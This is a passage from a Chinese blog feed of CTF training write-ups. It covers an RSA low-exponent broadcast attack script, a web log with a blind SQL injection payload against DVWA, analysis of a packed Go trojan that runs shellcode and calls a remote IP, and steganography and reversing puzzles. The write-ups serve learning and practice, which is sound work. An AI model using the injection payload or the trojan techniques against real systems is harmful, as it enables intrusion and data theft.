+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gmpy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_parse_number</span>(<span class="params">number</span>):</span><br><span class="line">    string = <span class="string">&quot;%x&quot;</span> % number</span><br><span class="line">    <span class="comment">#if len(string) != 64:</span></span><br><span class="line">    <span class="comment">#    return &quot;&quot;</span></span><br><span class="line">    erg = []</span><br><span class="line">    <span class="keyword">while</span> string != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        erg = erg + [<span class="built_in">chr</span>(<span class="built_in">int</span>(string[:<span class="number">2</span>], <span class="number">16</span>))]</span><br><span class="line">        string = string[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(erg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    x,y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    lastx, lasty = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, (q, b) = b, <span class="built_in">divmod</span>(a,b)</span><br><span class="line">        x, lastx = lastx-q*x, x</span><br><span class="line">        y, lasty = lasty-q*y, y</span><br><span class="line">    <span class="keyword">return</span> (lastx, lasty, a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder_theorem</span>(<span class="params">items</span>):</span><br><span class="line">  N = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    N *= n</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    m = N//n</span><br><span class="line">    r, s, d = extended_gcd(n, m)</span><br><span class="line">    <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">      N=N/n</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">      <span class="comment">#raise &quot;Input not pairwise co-prime&quot;</span></span><br><span class="line">    result += a*s*m</span><br><span class="line">  <span class="keyword">return</span> result % N, N</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1 = m**e mod n1</span></span><br><span class="line"><span class="string">c2 = m**e mod n2</span></span><br><span class="line"><span class="string">c3 = m**e mod n3</span></span><br><span class="line"><span class="string">. .</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sessions=[&#123;<span class="string">&quot;c&quot;</span>: <span class="number">2664456240866799628123354002961100780678777039452838534772316015487055657626151267255765909925238851052963177690615857269355367306531947285275658480119132176458619666356498982335615976520110220831553046336962209497199269751531446896806745547821273188359881207253304353340193045529947532321421316207582669186966262885925510852080336597611720270953364182776647640895915836757533572112922353511839592221769714011077657473370681864919378759906166093497668584965809250367719086157929143483067084526466393322021886107145372853920384593331401647566014964198106822275155018727443981449124990082600675418608431513247974233406</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">16158503998777337192674807945908821386693302597406387444349699542598095897285692091211476083809918750897861769264465663579793991679314429752295361957446059739359063103544638030154853387212724326557655148019702164400877330186327609348721648084613268414555203577183573889217351893673924371072333289354228674760315294504839359655489521012677566131327841053678744664608889174603997019849103346541029516404589134950647019313518381914869229067797614481107128126689730344210547636672896855115883318917823168989617075675281028751941660136853501327782175932311318584187206520215509966133929719351504589815606927966176149195779</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">8141444293590939926339140123606008320647283862734921035349993152736573212703175057344759120176139012159033736316173682242298057686577598027916977530077029856485627175379314811877501994761319423200265287785759453820095015807444949214265244900640835658881784054368646315441712319010363526404565445161985028402390954712866106921908734210919493250702187032275110124875570931002934221972634821225056433936935859313342958691599902102787445475305941582660308223893978598257522846759968671416599167447071747751521028177865487587852125772706197522666828868692341809398348371017535491453879955859658955741930595458023438100360</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">32317006071311007300714876688669951960444102669715484032130345427525853843244805988476588891865958825360448605290048592734632332583370763153757718383572299749209540231288997719992234568181178226221179583987114390330645720300200969658014581064237644699938356963972432409945268139827411216302358245968648685631852162149417921884611499140034180764281310426002777325893540359517405108625457448469440495488988134588122686723870538630903173922667307922091719215351000831684798921623126319342120005518066740737893055076255035167681805650095125693219744392056464805973406041558289941338164246139243161281441192654245812544809</span>&#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: <span class="number">32186692144821382556216414197036084450002406028322550030603281663242416068106078282460625499374288627277856236842632516201785581944392028997860442197688447471167439623993997293924922369564496861634056297046007484347428266405265850123438755524763475428402354354249708937585215741306623413807430961934859288170402397120084830356448790691150552044932030386388033322020053166574933222485614505111408006503260110878032569297769908686840698298294276083052356237977129947951638366162505197545851558874564120929824886880546857109477962821888212631753191393081515047983305638857450728393479191251293759249543719567211830591890</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span class="number">32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891768950486750990609730626074204953069170365351039844202147563211921699195999562457720327836338730130880314152322204629124008956222526289905774520564846695102147923912430235289375056683956240708354173616548191256839933106531936657610976268878493644409501763510589523424550621212340120772084161285303618671573000124518317607283263174664732027</span>&#125;]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> session <span class="keyword">in</span> sessions:</span><br><span class="line">    e=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">    n=session[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">    msg=session[<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">    data += [(msg, n)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please wait, performing CRT&quot;</span>)</span><br><span class="line">x, n = chinese_remainder_theorem(data)</span><br><span class="line">e=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">realnum = gmpy.iroot(x,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(realnum)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到最终结果</p>
+<p>134491505866050799518149049116410640504801097393689986282578875171467764060356652949245541838134430726585819015055443577486765212620027434842249657064471879286694101508916323731138545953360768175582990398279608814586282578875171467764060356652949245541838134430727023319615912208504801097393689986282578875</p>
+<p><strong>根据Crypto第二题ez_crypto下flag取后9位的提示，得到flag为</strong></p>
+<p>flag{282578875}</p>
+<p><del>很离谱吗？是的，很离谱，更离谱的是ez_cypto怎么算都是m&#x3D;512347890123，尝试提交flag几十遍都是错的</del></p>
+<h2 id="Unsolved-Problem"><a href="#Unsolved-Problem" class="headerlink" title="Unsolved Problem"></a>Unsolved Problem</h2><h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x05-misc2"><a href="#0x05-misc2" class="headerlink" title="0x05 misc2"></a>0x05 misc2</h4><p>图种格式，拆分为png+2*rar，png内容”secret is here”，rar内容5characters.txt加密</p>
+<p>png：</p>
+<p>没有找出更多隐写相关的线索</p>
+<p>5characters.txt：</p>
+<p>推测解压密码为5位字符，爆破时间需要2天多，放弃；内容为13位，推测为flag{XXXXXXX}，CRC32绕过需要7位，放弃</p>
+<h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x06-base"><a href="#0x06-base" class="headerlink" title="0x06 base"></a>0x06 base</h4><p>hint.txt内容为16，推测为base16</p>
+<p>base.txt内容为brainfuck加密和3538，解密之后为base和3538，将3538用base16（十六进制）解密后为58，合起来内容为base58，这是一种bitcoin的编码方式</p>
+<p>然后没了，试了一堆都试不出来</p>
+<h4 id="0x07-ez-cypto"><a href="#0x07-ez-cypto" class="headerlink" title="0x07 ez_cypto"></a>0x07 ez_cypto</h4><p>挺离谱的，RSA共模攻击，求出m&#x3D;512347890123，提示flag为后9位，我也挺想知道flag是啥的</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>NeSE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NeSE丙队3月月赛训练</title>
+    <url>/2021/03/14/NeSE%E4%B8%99%E9%98%9F3%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-misc-log-pcap"><a href="#0x00-misc-log-pcap" class="headerlink" title="0x00 misc_log&amp;pcap"></a>0x00 misc_log&amp;pcap</h4><p><strong>题目：</strong></p>
+<p>一个sql注入日志head.log和usb鼠标流量tail.pcap</p>
+<p><strong>sql注入日志：</strong></p>
+<p>直接看最后几十行格式为</p>
+<p><code>172.17.0.1 - - [22/Nov/2020:02:50:52 +0000] &quot;GET /vulnerabilities/sqli_blind/?id=2&#39; AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),1,1))%3E64 AND &#39;RCKM&#39;=&#39;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 </code></p>
+<p>其中%3E是’&gt;’，只要找到每个字符中最后为404状态码的注入ascii码就行</p>
+<p>结果为：<code>115、113、108、109、52、112、95、49、110</code></p>
+<p>转化为ASCII码为前半部分flag: <code>sqlm4p_1n</code></p>
+<p><strong>tail.pcap：</strong></p>
+<p>每个流量的usbdata长度为33，不属于鼠标和键盘流量的长度</p>
+<p>推测是添加了冗余数据</p>
+<p>利用tshark直接读取usbdata</p>
+<p><code>tshark -r tail.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></p>
+<p>删除前面部分长度不定的数据</p>
+<p>因为提取出来的数据不带冒号，一般的解码脚本按照有冒号的数据进行解码，所以这边用python代码给它添加上冒号</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) ==<span class="number">12</span>: <span class="comment"># 正常鼠标流量的话len改为8，但是本题有冗余数据</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后根据data数据格式，判断首尾字节都是多余的，在使用脚本并绘图时对其进行相应的处理</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">posx = <span class="number">0</span> </span><br><span class="line">posy = <span class="number">0</span> </span><br><span class="line">plt.figure(<span class="string">&#x27;letmeseewhatitis&#x27;</span>)</span><br><span class="line">x_list = []</span><br><span class="line">y_list = []</span><br><span class="line">ax = plt.gca()</span><br><span class="line"><span class="comment">#设置x轴、y轴名称</span></span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment">#画散点图，以x_list中的值为横坐标，以y_list中的值为纵坐标</span></span><br><span class="line"><span class="comment">#参数c指定点的颜色，s指定点的大小,alpha指定点的透明度</span></span><br><span class="line">ax.scatter(x_list, y_list, c=<span class="string">&#x27;r&#x27;</span>, s=<span class="number">20</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">18</span> :</span><br><span class="line">        line = line[<span class="number">3</span>:-<span class="number">4</span>] <span class="comment">#处理冗余数据</span></span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> : </span><br><span class="line">        x -= <span class="number">256</span> </span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> : </span><br><span class="line">        y -= <span class="number">256</span> </span><br><span class="line">    <span class="built_in">print</span>(x,y)</span><br><span class="line">    posx += x </span><br><span class="line">    posy += y </span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">1</span>:</span><br><span class="line">        x_list.append(posx)</span><br><span class="line">        y_list.append(posy)</span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">ax.scatter(x_list, y_list, c=<span class="string">&#x27;r&#x27;</span>, s=<span class="number">20</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<img src="/images/20210314204212.png" style="zoom:50%;" />
+
+<p>将其翻转镜像之后</p>
+<img src="/images/20210314204306.png" style="zoom: 67%;" />
+
+<p>得到后半部分flag：<code>m15c</code></p>
+<p>结合得到flag：flag{sqlm4p_1n_m15c}</p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x01-easy-crypto"><a href="#0x01-easy-crypto" class="headerlink" title="0x01 easy_crypto"></a>0x01 easy_crypto</h4><p><strong>题目：</strong></p>
+<p>小明使用某种加密算法加密了flag，他使用另一种加密方式保存了密钥，请根据给出的两组CODE，解码出flag。<br>hint: flag{xxxx}。</p>
+<p>CODE1: U2FsdGVkX1+LfMJfzt54pKO9O&#x2F;BZCaEixcnwUCHkxaJMQHsl5gPq0Q&#x3D;&#x3D;</p>
+<p>CODE2: 882041088210880410210884</p>
+<p><strong>CODE2</strong>：</p>
+<p>根据题目可知code2是加密之后的密钥，一开始考虑为进制转换，尝试无果</p>
+<p>发现CODE2的每一位都是2的幂次，尝试二进制幂次加密</p>
+<p>编写代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;882041088210880410210884&quot;</span></span><br><span class="line">a=a.split(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">     <span class="built_in">str</span> = a[i]</span><br><span class="line">     <span class="built_in">list</span>=[]</span><br><span class="line">     <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="built_in">list</span>.append(j)</span><br><span class="line">        length = <span class="built_in">len</span>(<span class="built_in">list</span>)</span><br><span class="line">     <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,length):</span><br><span class="line">        <span class="built_in">sum</span>+=<span class="built_in">int</span>(<span class="built_in">list</span>[k])</span><br><span class="line">     flag+=<span class="built_in">chr</span>(<span class="built_in">sum</span>+<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>得到密钥为：RESPECT</p>
+<p><strong>CODE1：</strong></p>
+<p>CODE1有个明显特征U2FsdGVkX1，是Salted_的base64，一般出现在AES和DES中</p>
+<p>利用密钥RESPECT解密，AES无法解密</p>
+<p>DES解密得到<code>flag&#123;niuniankuaile&#125;</code></p>
+<h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="0x02-sequence"><a href="#0x02-sequence" class="headerlink" title="0x02 sequence"></a>0x02 sequence</h4><p><strong>题目：</strong></p>
+<p>一个ELF文件</p>
+<p><strong>题解：</strong></p>
+<p>IDA打开，在main函数中还原伪代码</p>
+<img src="/images/20210314205402.png" style="zoom: 67%;" />
+
+<p>main功能包括</p>
+<ul>
+<li>输入一个input传递给v8，v8长度为18</li>
+<li>&amp;v10-112即是&amp;v8</li>
+<li>要求v8数组经过off_40B0字符串变换后，与aCtfThis_is_fla数组保持一致</li>
+<li>aCtfThis_is_fla即是flag</li>
+</ul>
+<p>找到aCtfThis_is_fla数组，其内容为</p>
+<p><code>ctf&#123;this_is_flag2&#125;</code></p>
+<p>off_40B0是一个字符串，内容为</p>
+<p><code>&quot;u^&gt;d@!y2THOG/tgQ&#39;%P~8k#.NZw4*EMc+U)l5=r0KL$_&amp;D\\,x9-AB|sa?RmeS3\&quot;ibfj;CF o`J]6XhV:n7WI(q1[z&#125;v&lt;&#123;Yp&quot;</code></p>
+<p>定义off_40B为a，aCtfThis_is_fla为b，v8为flag，其中三者关系为</p>
+<p><code>b[i]=a[flag[i]-32]</code></p>
+<p>编写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;u^&gt;d@!y2THOG/tgQ&#x27;%P~8k#.NZw4*EMc+U)l5=r0KL$_&amp;D\\,x9-AB|sa?RmeS3\&quot;ibfj;CF o`J]6XhV:n7WI(q1[z&#125;v&lt;&#123;Yp&quot;</span></span><br><span class="line">b = <span class="string">&quot;ctf&#123;this_is_flag2&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(a.index(i)+<span class="number">32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>flag&#123;?-a|-m_VK_VKaCW.&#39;y&#125;</code></p>
+<h4 id="0x03-flagin5"><a href="#0x03-flagin5" class="headerlink" title="0x03 flagin5"></a>0x03 flagin5</h4><p><strong>题目：</strong></p>
+<p>一个Pyinstaller贪吃蛇小程序</p>
+<p><strong>题解：</strong></p>
+<p>尝试用cheater engine定位分数所在地址，然后直接修改分数，发现无法定位</p>
+<p>浪费很多时间，<del>主要是更新windows花了三个小时</del>，重新做题</p>
+<p>思考题目含义flag in 5，用string.exe查找程序字符串，也没找到5这个文件和相关的东西</p>
+<p>查询Pyinstaller相关内容，然后下载了<code>pyinstxtractor.py</code>准备解包试试</p>
+<p>解包完之后发现5这个文件</p>
+<p>直接用010 Editor打开</p>
+<p><img src="/images/20210314211501.png"></p>
+<p>得到<code>flag&#123;Wow_So_Amazing!!&#125;</code></p>
+<h4 id="0x04-Easy-Go-Trojan"><a href="#0x04-Easy-Go-Trojan" class="headerlink" title="0x04 Easy-Go-Trojan"></a>0x04 Easy-Go-Trojan</h4><p><strong>题目：</strong></p>
+<p><strong>题解：</strong></p>
+<p>先用Detect It Easy查壳</p>
+<img src="/images/20210314223833.png" style="zoom:67%;" />
+
+<p>发现有upx压缩壳，用upx.exe脱壳</p>
+<p><img src="/images/20210314224104.png"></p>
+<p>goexp.exe丢进ida和dbg中（要关掉杀毒软件）</p>
+<p><strong>ida：</strong></p>
+<p>找到main_main函数入口</p>
+<p>反汇编后伪代码如下</p>
+<img src="/images/20210314230038.png" style="zoom:67%;" />
+
+<p>可以看到在main_main执行过程中，有一个必定退出的if语句，argc参数数要不小于65535，这个需要我们在动态执行时跳过</p>
+<p>函数功能时为shellcode分配一个空间，并将其复制到内存中，然后执行shellcode</p>
+<p>我们还需要在SysinternalsSuite中找到Procmon.exe工具，设置过滤器如图所示，点击add和apply·</p>
+<p><img src="/images/20210314231355.png"></p>
+<p><strong>dbg：</strong></p>
+<p>在main_main函数入口0x468F90处下一个断点，点击运行，然后单步运行到0x468FD0处，将RIP直接跳转至0x468FE1，然后继续执行</p>
+<p><img src="/images/20210314231050.png"></p>
+<p>在Procmon.exe监控处可以看到目的ip和端口</p>
+<img src="/images/20210314231125.png" style="zoom:67%;" />
+
+<p>得到<code>flag&#123;47.93.231.121:18080&#125;</code></p>
+<h4 id="0x05-Maze"><a href="#0x05-Maze" class="headerlink" title="0x05 Maze"></a>0x05 Maze</h4><p><strong>题目：</strong></p>
+<p>一个迷宫输入wasd的exe程序</p>
+<p><strong>题解：</strong></p>
+<p>exe打开后显示内容</p>
+<img src="/images/20210314215758.png" style="zoom: 80%;" />
+
+<p>本题其实可以根据题目意思和exe内容直接猜出flag</p>
+<p>将exe第一行内容拼装成一个迷宫，然后进行wasd移动</p>
+<p>正常的逆向解法</p>
+<p>IDA导入wasd.exe，找到start函数入口</p>
+<p><img src="/images/20210314220131.png"></p>
+<p>call与jmp判断为vs编译程序，进入jmp寻找main函数</p>
+<p>main函数的特征为3个push和1个call，在loc_401408处找到_p__argv和_p__argc，以及main函数入口的特征</p>
+<p><img src="/images/20210314220419.png"></p>
+<p>跳转之后，发现无法创建function和反编译，在后面发现有干扰ida的指令</p>
+<p><img src="/images/20210314220630.png"></p>
+<p>jnz跳转loc_40116E+2，而jmp拼接了不存在的地址0E085D960h</p>
+<img src="/images/20210314221054.png" style="zoom:67%;" />
+
+<p>具体行为如下图所示</p>
+<p><img src="/images/20210314221312.png"></p>
+<p>修改HEX将E9 ED改为90 90的NOP指令后恢复正常</p>
+<img src="/images/20210314221441.png" style="zoom:67%;" />
+
+<p>回到loc 401100处，创建function，然后反编译，得到伪代码如下图</p>
+<img src="/images/20210314221640.png" style="zoom:67%;" />
+
+<p>aSD为迷宫字符串，拼接得到迷宫为</p>
+<p><img src="/images/20210314222142.png"></p>
+<p>点击运行wasd.exe，输入<code>sssdddwwwddddddsssaaaw</code>后</p>
+<p><img src="/images/20210314222333.png"></p>
+<p>因此，得到<code>flag&#123;sssdddwwwddddddsssaaaw&#125;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>NeSE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NeSE丙队5月月赛训练</title>
+    <url>/2021/05/29/NeSE%E4%B8%99%E9%98%9F5%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-嗷呜"><a href="#0x00-嗷呜" class="headerlink" title="0x00 嗷呜"></a>0x00 嗷呜</h4><p>简单查一下，兽音加密，直接 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a> 输入内容，得到一串01数组</p>
+<p>01数组共841位，简单的29*29，估计是二维码，简单处理一下</p>
+<p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from zlib import *</span><br><span class="line"></span><br><span class="line">MAX = 29</span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line">str =&quot;1111111011000110100000111111110000010010001110001001000001101110100101101001001010111011011101010100000001000101110110111010101000000110001011101100000101011100010110010000011111111010101010101010111111100000000100001011101100000000100010111010010001011111110010111110011000110101001011010101000010001010001110000101101001001000110001001100001010010111101001111111110101010000000111101101100000000101011001110111101101011100000000011011001000100101101110010110101100001010100111000101010000011110101001000011011000011101010010111001001000111011000110100011000000100100111101111010111100101000011110101111110100000000010010000011010001010111111110110011110010101011001100000100100010110011000110001011101011101100000111111010110111010011001101011110000010101110100001001011000100011111000001000001000011111100101111111110110010111011110101010&quot;</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">for y in range(0,MAX):</span><br><span class="line">    for x in range(0,MAX):</span><br><span class="line">        if(str[i] == &#x27;1&#x27;):</span><br><span class="line">            pic.putpixel([x,y],(0,0,0))</span><br><span class="line">        else:pic.putpixel([x,y],(255,255,255))</span><br><span class="line">        i = i+1</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/qpQNZDAvgS82I8ZQZ730rA.png"></p>
+<p>flag{we_mia0_mia0_t0gether}</p>
+<h4 id="0x01-crypto-0range"><a href="#0x01-crypto-0range" class="headerlink" title="0x01 crypto_0range"></a>0x01 crypto_0range</h4><p>过于简单的签到题</p>
+<p>base64解第一行：523641</p>
+<p>第二行看前6位出现flag{的标志，直接重新排序即可得到flag{crypto_is_magical!}</p>
+<h4 id="0X02-ultra-combine"><a href="#0X02-ultra-combine" class="headerlink" title="0X02 ultra_combine"></a>0X02 ultra_combine</h4><p>1.png 无法打开，但是可以直接用Stegsolve.jar查看，文件长宽500*359，CRC32值为0x2ca75026，直接上代码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc = open(&quot;1.png&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">	data = misc[12:16] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[20:29]  #IHDR数据</span><br><span class="line">	crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">	if crc32 == 0x2ca75026: #IHDR块的crc32值</span><br><span class="line">		print(i)</span><br><span class="line">		print(&quot;hex:&quot;+hex(i))</span><br><span class="line"></span><br><span class="line"># 爆破高		</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data = misc[12:20] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[24:29]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 == 0x2ca75026:</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot;+hex(i))</span><br></pre></td></tr></table></figure>
+
+<p>得到长宽应该为500*396，进入010editor修改，得到图1完整图片</p>
+<p><img src="/images/LBKQmvHn6GNC0Ua4AyfRdg.png"></p>
+<p>2.zip压缩包需要密码，先猜测是伪加密，直接winrar修复文件，拿到图片。查看EXIF信息，得到如下数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名: 2.jpg</span><br><span class="line">图片大小: 120.2KB</span><br><span class="line">修改日期: 2021/05/06 00:30:26</span><br><span class="line">图片信息: 500x500 (Jpeg,YUV444)</span><br><span class="line">软件: 2is-AllHailUltra0</span><br><span class="line">艺术家: Meitu</span><br><span class="line">拍摄日期: 2021/04/10 16:24:51</span><br><span class="line">评论: &#123;&quot;Version&quot;:&quot;1.0.0&quot;,&quot;BeautyInfo&quot;:&#123;&quot;IsAIBeauty&quot;:false,&quot;IsOldBeauty&quot;:false,&quot;IsSkinColour&quot;:false,&quot;SwitchMedicatedAcne&quot;:false,&quot;IsBrightEyes&quot;:false,&quot;IsReduceBlackEyes&quot;:false,&quot;IsSharpen&quot;:false&#125;,&quot;FaceliftInfo&quot;:&#123;&quot;IsChangeFacelift&quot;:false,&quot;IsChangeThinFace&quot;:false,&quot;IsChangeEyeLift&quot;:false,&quot;IsChangeFaceChin&quot;:false,&quot;IsChangeNose&quot;:false,&quot;IsChangeMouth&quot;:false&#125;,&quot;FilterInfo&quot;:&#123;&quot;IsUseFilter&quot;:false&#125;,&quot;ARInfo&quot;:&#123;&quot;IsUseAR&quot;:false&#125;,&quot;MakeupInfo&quot;:&#123;&quot;IsUseMakeup&quot;:false&#125;,&quot;HandlerInfo&quot;:&#123;&quot;AppName&quot;:2&#125;,&quot;SoftHairInfo&quot;:&#123;&quot;IsUseSoftHair&quot;:false&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较显著的信息是软件名2is-AllHailUltra0</p>
